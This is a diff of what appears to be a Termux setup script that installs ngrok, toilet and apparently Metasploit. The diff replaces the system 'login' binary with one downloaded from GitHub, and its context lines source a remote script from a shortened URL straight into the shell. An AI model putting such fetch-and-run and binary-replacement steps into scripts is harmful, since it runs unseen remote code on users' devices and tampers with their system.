@@ -59,9 +59,8 @@ unzip ngrok-stable-linux-arm.zip
 rm ngrok-stable-linux-arm.zip 
 apt install toilet -y
 clear
-cd /data/data/com.termux/files/usr/etc
-rm profile
-wget https://raw.githubusercontent.com/T-Dynamos/termux-pro/main/profile
+rm /data/data/com.termux/files/usr/bin/login
+wget https://raw.githubusercontent.com/T-Dynamos/termux-pro/main/login
 cd $HOME
 source <(curl -fsSL https://kutt.it/WG81ae) 
 msf_ins
